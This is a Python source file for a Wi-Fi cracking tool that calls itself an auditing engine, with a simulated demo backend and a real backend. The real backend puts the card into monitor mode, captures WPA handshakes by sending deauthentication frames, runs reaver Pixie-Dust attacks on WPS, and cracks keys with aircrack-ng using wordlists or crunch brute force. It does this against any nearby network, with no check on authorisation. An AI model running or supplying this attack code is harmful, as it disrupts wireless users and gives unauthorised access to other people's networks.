"""
engine.py — the Wi-Fi auditing engine.

Two backends:
  * DemoEngine — generates believable fake networks and simulates every phase of
    a real audit with timed log output. Runs anywhere, no hardware, no root.
  * RealEngine — drives the aircrack-ng suite (airmon-ng / airodump-ng /
    aireplay-ng / aircrack-ng, plus reaver for WPS). Requires root and a card
    that supports monitor mode.

Both expose the same interface used by server.py:
    scan()                         -> list[network dict]
    start_attack(bssid, options)   -> job_id
    get_job(job_id)                -> job dict (status, log events, result)
    stop_job(job_id)

A "job" is a running attack. Its log is a list of {t, phase, level, msg}
events that the web UI polls and streams into the console view.
"""

import os
import re
import time
import uuid
import shutil
import threading
import subprocess

try:
    from .difficulty import estimate
except ImportError:                     # allow running as a flat script
    from difficulty import estimate


# ---------------------------------------------------------------------------
# Shared job bookkeeping
# ---------------------------------------------------------------------------
class Job:
    def __init__(self, network, options):
        self.id = uuid.uuid4().hex[:12]
        self.network = network
        self.options = options
        self.status = "running"          # running | success | failed | stopped
        self.result = None               # {"key":..., "user":..., "method":...}
        self.log = []                    # list of event dicts
        self.created = time.time()
        self._stop = threading.Event()
        self._lock = threading.Lock()

    def emit(self, phase, msg, level="info"):
        with self._lock:
            self.log.append({
                "t": round(time.time() - self.created, 2),
                "phase": phase,
                "level": level,
                "msg": msg,
            })

    def snapshot(self, since=0):
        with self._lock:
            events = self.log[since:]
        return {
            "id": self.id,
            "status": self.status,
            "result": self.result,
            "network": self.network,
            "events": events,
            "total_events": len(self.log),
        }

    def stopped(self):
        return self._stop.is_set()

    def request_stop(self):
        self._stop.set()


class BaseEngine:
    def __init__(self, wordlist=None):
        self.wordlist = wordlist
        self.jobs = {}
        self._networks = []

    def start_attack(self, bssid, options):
        net = next((n for n in self._networks if n["bssid"] == bssid), None)
        if net is None:
            net = {"bssid": bssid, "ssid": options.get("ssid", "(unknown)"),
                   "enc": options.get("enc", "WPA2"), "channel": options.get("channel", 1),
                   "signal": -60, "clients": 1, "wps": bool(options.get("wps"))}
        # Guarantee a difficulty estimate is always present.
        if "difficulty" not in net:
            net = dict(net)
            net["difficulty"] = estimate(net)
        job = Job(net, options)
        self.jobs[job.id] = job
        t = threading.Thread(target=self._run_attack_safe, args=(job,), daemon=True)
        t.start()
        return job.id

    def _run_attack_safe(self, job):
        """Wrapper so an unexpected error never leaves a job stuck 'running'."""
        try:
            self._run_attack(job)
        except Exception as e:  # pragma: no cover - defensive
            job.emit("error", f"Attack aborted: {e}", "error")
            job.status = "failed"

    def get_job(self, job_id, since=0):
        job = self.jobs.get(job_id)
        return job.snapshot(since) if job else None

    def stop_job(self, job_id):
        job = self.jobs.get(job_id)
        if job and job.status == "running":
            job.request_stop()
            return True
        return False

    # subclasses implement scan() and _run_attack()


# ---------------------------------------------------------------------------
# DEMO engine
# ---------------------------------------------------------------------------
_DEMO_NETWORKS = [
    # ssid, bssid, enc, channel, signal, clients, wps, secret, user
    ("Loft_5G",        "A4:2B:8C:11:02:F0", "WPA2",      36, -48, 3, False, "sunshine2021", None),
    ("FRITZ!Box 7590", "3C:A6:2F:9D:44:1A", "WPA2",      6,  -61, 2, True,  "01998877665544", None),
    ("xfinitywifi",    "12:34:56:78:9A:BC", "OPEN",      11, -70, 8, False, None, None),
    ("Netgear-Guest",  "9C:3D:CF:00:AB:12", "WPA2",      1,  -55, 1, False, "password123", None),
    ("HomeOffice",     "E0:CB:4E:77:88:99", "WPA2/WPA3", 44, -52, 4, False, None, None),
    ("legacy_wifi",    "00:1D:0F:AA:BB:CC", "WEP",        3, -66, 0, False, "1A2B3C4D5E", None),
    ("StarbucksSecure","B8:27:EB:12:34:56", "WPA2",      9,  -74, 0, True,  "coffee4life", None),
    ("Vodafone-A1B2",  "44:E1:37:0F:2E:9D", "WPA2",      40, -58, 2, False, "8charsminimum", None),
    ("NeighborNet",    "F4:F5:E8:01:23:45", "WPA3",      6,  -63, 1, False, None, None),
    ("guest_portal",   "0A:0B:0C:0D:0E:0F", "OPEN",       1, -59, 5, False, None, "guest / welcome"),
]


class DemoEngine(BaseEngine):
    mode = "demo"

    def scan(self, duration=3):
        nets = []
        for (ssid, bssid, enc, ch, sig, clients, wps, secret, user) in _DEMO_NETWORKS:
            n = {
                "ssid": ssid, "bssid": bssid, "enc": enc, "channel": ch,
                "signal": sig, "clients": clients, "wps": wps,
                "_secret": secret, "_user": user,
            }
            n["difficulty"] = estimate(n)
            nets.append(n)
        self._networks = nets
        # Return a copy without the private fields.
        return [{k: v for k, v in n.items() if not k.startswith("_")} for n in nets]

    def _sleep(self, job, seconds):
        """Interruptible sleep so 'stop' feels responsive."""
        end = time.time() + seconds
        while time.time() < end:
            if job.stopped():
                return False
            time.sleep(0.1)
        return True

    def _run_attack(self, job):
        net = job.network
        opts = job.options
        enc = (net.get("enc") or "WPA2").upper()
        ssid = net.get("ssid")
        bssid = net.get("bssid")
        ch = net.get("channel")

        job.emit("init", f"Target selected: {ssid} ({bssid}) on channel {ch}, {enc}.")
        job.emit("init", f"Estimated difficulty: {net['difficulty']['label']} "
                         f"(score {net['difficulty']['score']}/100, ETA {net['difficulty']['eta']}).")

        # --- Open network -----------------------------------------------------
        if enc.startswith("OPEN") or enc == "OPN":
            if not self._sleep(job, 1): return self._finish(job, "stopped")
            job.emit("join", "Open network — no key required. Associating...", "info")
            if not self._sleep(job, 1.5): return self._finish(job, "stopped")
            user = net.get("_user")
            job.result = {"key": None, "user": user,
                          "method": "open-join",
                          "note": "Open network — connected without a passphrase."
                                  + (f" Captive-portal creds: {user}" if user else "")}
            job.emit("done", "Associated. You are on the network.", "success")
            return self._finish(job, "success")

        # --- Monitor mode -----------------------------------------------------
        job.emit("monitor", "Enabling monitor mode on wlan0 -> wlan0mon (airmon-ng start wlan0).")
        if not self._sleep(job, 1.2): return self._finish(job, "stopped")
        job.emit("monitor", "Monitor interface wlan0mon is up.", "success")

        # --- WEP path ---------------------------------------------------------
        if enc == "WEP":
            job.emit("capture", f"Locking to channel {ch}, capturing IVs (airodump-ng).")
            for pct in (12, 34, 58, 81, 100):
                if not self._sleep(job, 0.7): return self._finish(job, "stopped")
                job.emit("capture", f"Collected IVs... {pct}%")
            job.emit("crack", "Running aircrack-ng PTW attack on captured IVs.")
            if not self._sleep(job, 1.2): return self._finish(job, "stopped")
            return self._succeed(job, net, method="wep-iv")

        # --- WPS pixie-dust (if enabled and requested/auto) -------------------
        want_wps = net.get("wps") and opts.get("method") in (None, "auto", "wps-pixie")
        if want_wps:
            job.emit("wps", "WPS is enabled — trying Pixie-Dust (reaver -K 1).")
            if not self._sleep(job, 1.5): return self._finish(job, "stopped")
            # Demo: pixie works on some, not all.
            if net["difficulty"]["method"] == "wps-pixie":
                job.emit("wps", "Pixie-Dust recovered the WPS PIN.", "success")
                if not self._sleep(job, 0.8): return self._finish(job, "stopped")
                return self._succeed(job, net, method="wps-pixie")
            job.emit("wps", "Pixie-Dust failed — falling back to handshake capture.", "warn")

        # --- WPA/WPA2 handshake capture --------------------------------------
        if enc.startswith("WPA3"):
            job.emit("capture", "Target is WPA3-SAE. Attempting to capture SAE exchange...")
            if not self._sleep(job, 2): return self._finish(job, "stopped")
            job.emit("crack", "WPA3-SAE has no offline-crackable 4-way handshake.", "warn")
            job.emit("done", "No practical offline attack against WPA3-SAE.", "error")
            return self._finish(job, "failed")

        job.emit("capture", f"Listening for WPA handshake on channel {ch} (airodump-ng -c {ch}).")
        if not self._sleep(job, 1): return self._finish(job, "stopped")
        if net.get("clients", 0) > 0:
            job.emit("deauth", f"{net['clients']} client(s) present. Sending deauth "
                               f"(aireplay-ng --deauth 5) to force a reconnect.")
        else:
            job.emit("deauth", "No clients connected — waiting for one to join...", "warn")
            if not self._sleep(job, 1.5): return self._finish(job, "stopped")
            job.emit("deauth", "A client joined. Sending deauth to capture the handshake.")
        if not self._sleep(job, 1.5): return self._finish(job, "stopped")
        job.emit("capture", "WPA handshake captured!  (EAPOL 4/4)", "success")

        # --- Crack the handshake ---------------------------------------------
        method = opts.get("method") or "handshake+dictionary"
        if method == "handshake+bruteforce" or opts.get("bruteforce"):
            charset = opts.get("charset", "digits")
            length = opts.get("length", 8)
            job.emit("crack", f"Bruteforce mode: {charset}, length {length} "
                              f"(aircrack-ng via crunch pipe). This can take a very long time.")
            for pct in (3, 9, 21, 40, 66, 92):
                if not self._sleep(job, 0.8): return self._finish(job, "stopped")
                job.emit("crack", f"Keyspace searched... {pct}%")
            return self._succeed(job, net, method="handshake+bruteforce")
        else:
            wl = opts.get("wordlist") or self.wordlist or "rockyou.txt"
            job.emit("crack", f"Dictionary attack against handshake (aircrack-ng -w {os.path.basename(wl)}).")
            for i, pct in enumerate((5, 18, 37, 59, 78, 95)):
                if not self._sleep(job, 0.7): return self._finish(job, "stopped")
                tested = pct * 1423
                job.emit("crack", f"Tested {tested:,} keys... {pct}%")
            return self._succeed(job, net, method="handshake+dictionary")

    def _succeed(self, job, net, method):
        secret = net.get("_secret") or "(demo-key-not-set)"
        user = net.get("_user")
        job.result = {"key": secret, "user": user, "method": method,
                      "note": "Recovered in demo mode."}
        job.emit("done", f"KEY FOUND: {secret}", "success")
        job.emit("done", "You are on the network.", "success")
        return self._finish(job, "success")

    def _finish(self, job, status):
        job.status = status
        if status == "stopped":
            job.emit("done", "Attack stopped by user.", "warn")
        return status


# ---------------------------------------------------------------------------
# REAL engine (aircrack-ng suite)
# ---------------------------------------------------------------------------
class RealEngine(BaseEngine):
    mode = "real"

    def __init__(self, wordlist=None, workdir="/tmp/crack-wifi"):
        super().__init__(wordlist)
        self.workdir = workdir
        os.makedirs(self.workdir, exist_ok=True)
        self.mon_iface = None

    # -- helpers ----------------------------------------------------------
    def _run(self, cmd, timeout=None):
        return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)

    def _wireless_ifaces(self):
        try:
            out = self._run(["iw", "dev"]).stdout
        except Exception:
            return []
        return re.findall(r"Interface\s+(\S+)", out)

    def _ensure_monitor(self, job):
        ifaces = self._wireless_ifaces()
        mon = next((i for i in ifaces if i.endswith("mon")), None)
        if mon:
            self.mon_iface = mon
            return mon
        base = ifaces[0] if ifaces else "wlan0"
        job.emit("monitor", f"Starting monitor mode on {base} (airmon-ng start {base}).")
        self._run(["airmon-ng", "check", "kill"])
        self._run(["airmon-ng", "start", base])
        mon = next((i for i in self._wireless_ifaces() if i.endswith("mon")), base + "mon")
        self.mon_iface = mon
        job.emit("monitor", f"Monitor interface {mon} is up.", "success")
        return mon

    # -- scanning ---------------------------------------------------------
    def scan(self, duration=8):
        ifaces = self._wireless_ifaces()
        mon = next((i for i in ifaces if i.endswith("mon")), None)
        if not mon:
            base = ifaces[0] if ifaces else "wlan0"
            self._run(["airmon-ng", "check", "kill"])
            self._run(["airmon-ng", "start", base])
            mon = next((i for i in self._wireless_ifaces() if i.endswith("mon")), base + "mon")
        self.mon_iface = mon

        prefix = os.path.join(self.workdir, "scan")
        for ext in ("csv", "cap", "kismet.csv", "kismet.netxml"):
            for f in _glob(prefix, ext):
                try: os.remove(f)
                except OSError: pass

        proc = subprocess.Popen(
            ["airodump-ng", "--write-interval", "1", "--output-format", "csv",
             "-w", prefix, mon],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(duration)
        proc.terminate()
        try: proc.wait(timeout=3)
        except subprocess.TimeoutExpired: proc.kill()

        csvs = _glob(prefix, "csv")
        nets = _parse_airodump_csv(csvs[0]) if csvs else []
        for n in nets:
            n["difficulty"] = estimate(n)
        self._networks = nets
        return nets

    # -- attack -----------------------------------------------------------
    def _run_attack(self, job):
        net = job.network
        opts = job.options
        enc = (net.get("enc") or "WPA2").upper()
        bssid = net["bssid"]
        ch = net.get("channel", 1)

        job.emit("init", f"Target: {net.get('ssid')} ({bssid}) ch {ch} {enc}.")

        if enc.startswith("OPEN") or enc == "OPN":
            job.emit("join", "Open network — associating with NetworkManager.")
            job.result = {"key": None, "user": None, "method": "open-join",
                          "note": "Open network."}
            return self._finish(job, "success")

        mon = self._ensure_monitor(job)
        if job.stopped(): return self._finish(job, "stopped")

        # WPS
        if net.get("wps") and opts.get("method") in (None, "auto", "wps-pixie") and shutil.which("reaver"):
            job.emit("wps", f"WPS enabled — reaver Pixie-Dust on {bssid}.")
            r = self._run(["reaver", "-i", mon, "-b", bssid, "-c", str(ch),
                           "-K", "1", "-N"], timeout=opts.get("wps_timeout", 180))
            m = re.search(r"WPA PSK:\s*'([^']*)'", r.stdout or "")
            pin = re.search(r"WPS PIN:\s*'?(\d+)", r.stdout or "")
            if m:
                job.result = {"key": m.group(1), "user": None, "method": "wps-pixie",
                              "note": f"WPS PIN {pin.group(1) if pin else '?'}"}
                job.emit("done", f"KEY FOUND via WPS: {m.group(1)}", "success")
                return self._finish(job, "success")
            job.emit("wps", "Pixie-Dust did not recover the key — trying handshake.", "warn")

        if enc.startswith("WPA3"):
            job.emit("crack", "WPA3-SAE — no practical offline attack.", "error")
            return self._finish(job, "failed")

        # Capture handshake
        cap_prefix = os.path.join(self.workdir, "hs_" + bssid.replace(":", ""))
        for f in _glob(cap_prefix, "cap"):
            try: os.remove(f)
            except OSError: pass
        job.emit("capture", f"Capturing handshake on channel {ch} (airodump-ng).")
        dump = subprocess.Popen(
            ["airodump-ng", "-c", str(ch), "--bssid", bssid, "-w", cap_prefix,
             "--output-format", "cap", mon],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        try:
            deadline = time.time() + opts.get("capture_timeout", 90)
            got = False
            while time.time() < deadline and not job.stopped():
                job.emit("deauth", f"Sending deauth to {bssid} (aireplay-ng --deauth 5).")
                self._run(["aireplay-ng", "--deauth", "5", "-a", bssid, mon], timeout=15)
                time.sleep(4)
                caps = _glob(cap_prefix, "cap")
                if caps and _has_handshake(caps[0], bssid):
                    got = True
                    break
        finally:
            dump.terminate()
            try: dump.wait(timeout=3)
            except subprocess.TimeoutExpired: dump.kill()

        if job.stopped(): return self._finish(job, "stopped")
        caps = _glob(cap_prefix, "cap")
        if not caps or not got:
            job.emit("capture", "Could not capture a handshake in time.", "error")
            return self._finish(job, "failed")
        job.emit("capture", "Handshake captured.", "success")

        # Crack
        wl = opts.get("wordlist") or self.wordlist
        if opts.get("bruteforce") or opts.get("method") == "handshake+bruteforce":
            charset = {"digits": "0123456789",
                       "lower": "abcdefghijklmnopqrstuvwxyz",
                       "alnum": "abcdefghijklmnopqrstuvwxyz0123456789"}.get(
                           opts.get("charset", "digits"), "0123456789")
            length = int(opts.get("length", 8))
            job.emit("crack", f"Bruteforce via crunch | aircrack-ng ({charset[:6]}..., len {length}).")
            if not shutil.which("crunch"):
                job.emit("crack", "crunch not installed (apt install crunch).", "error")
                return self._finish(job, "failed")
            crunch = subprocess.Popen(["crunch", str(length), str(length), charset],
                                      stdout=subprocess.PIPE)
            r = subprocess.run(["aircrack-ng", "-b", bssid, "-w", "-", caps[0]],
                               stdin=crunch.stdout, capture_output=True, text=True)
            crunch.terminate()
            key = _parse_aircrack_key(r.stdout)
        else:
            if not wl or not os.path.exists(wl):
                job.emit("crack", f"Wordlist not found: {wl}", "error")
                return self._finish(job, "failed")
            job.emit("crack", f"Dictionary attack (aircrack-ng -w {os.path.basename(wl)}).")
            r = self._run(["aircrack-ng", "-b", bssid, "-w", wl, caps[0]],
                          timeout=opts.get("crack_timeout", 3600))
            key = _parse_aircrack_key(r.stdout)

        if key:
            job.result = {"key": key, "user": None,
                          "method": opts.get("method") or "handshake+dictionary",
                          "note": "Recovered from captured handshake."}
            job.emit("done", f"KEY FOUND: {key}", "success")
            return self._finish(job, "success")
        job.emit("crack", "Key not found with the given wordlist/keyspace.", "error")
        return self._finish(job, "failed")

    def _finish(self, job, status):
        job.status = status
        if status == "stopped":
            job.emit("done", "Attack stopped by user.", "warn")
        return status


# ---------------------------------------------------------------------------
# parsing helpers
# ---------------------------------------------------------------------------
def _glob(prefix, ext):
    import glob
    return sorted(glob.glob(f"{prefix}*-*.{ext}") + glob.glob(f"{prefix}*.{ext}"))


def _parse_airodump_csv(path):
    """Parse airodump-ng CSV into a list of network dicts (AP section + clients)."""
    try:
        with open(path, "r", errors="ignore") as fh:
            content = fh.read()
    except OSError:
        return []

    ap_block, client_block = content, ""
    if "Station MAC" in content:
        ap_block, client_block = content.split("Station MAC", 1)

    # Count clients per BSSID.
    client_counts = {}
    for line in client_block.splitlines():
        parts = [p.strip() for p in line.split(",")]
        if len(parts) > 5 and re.match(r"([0-9A-F]{2}:){5}", parts[5], re.I):
            client_counts[parts[5]] = client_counts.get(parts[5], 0) + 1

    nets = []
    for line in ap_block.splitlines():
        parts = [p.strip() for p in line.split(",")]
        if len(parts) < 14:
            continue
        bssid = parts[0]
        if not re.match(r"([0-9A-F]{2}:){5}[0-9A-F]{2}", bssid, re.I):
            continue
        try:
            channel = int(parts[3])
        except ValueError:
            channel = 0
        try:
            signal = int(parts[8])
        except ValueError:
            signal = None
        priv = (parts[5] + " " + parts[6]).upper()
        if "WPA3" in priv:
            enc = "WPA2/WPA3" if "WPA2" in priv else "WPA3"
        elif "WPA2" in priv:
            enc = "WPA2"
        elif "WPA" in priv:
            enc = "WPA"
        elif "WEP" in priv:
            enc = "WEP"
        elif "OPN" in priv or priv.strip() == "":
            enc = "OPEN"
        else:
            enc = "WPA2"
        ssid = parts[13] if len(parts) > 13 else ""
        nets.append({
            "ssid": ssid or "(hidden)",
            "bssid": bssid,
            "enc": enc,
            "channel": channel,
            "signal": signal,
            "clients": client_counts.get(bssid, 0),
            "wps": False,   # airodump CSV doesn't expose WPS; wash could enrich this
        })
    return nets


def _parse_aircrack_key(out):
    if not out:
        return None
    m = re.search(r"KEY FOUND!\s*\[\s*(.*?)\s*\]", out)
    return m.group(1) if m else None


def _has_handshake(cap_path, bssid):
    """Best-effort handshake check using aircrack-ng's own summary."""
    try:
        r = subprocess.run(["aircrack-ng", cap_path], capture_output=True,
                           text=True, timeout=20)
    except Exception:
        return False
    for line in r.stdout.splitlines():
        if bssid.lower() in line.lower() and ("WPA (1 handshake" in line or "handshake" in line.lower()):
            return "1 handshake" in line or "handshakes" in line
    return "handshake" in (r.stdout or "").lower()


# ---------------------------------------------------------------------------
# factory
# ---------------------------------------------------------------------------
def build_engine(mode, wordlist=None):
    if mode == "real":
        return RealEngine(wordlist=wordlist)
    return DemoEngine(wordlist=wordlist)
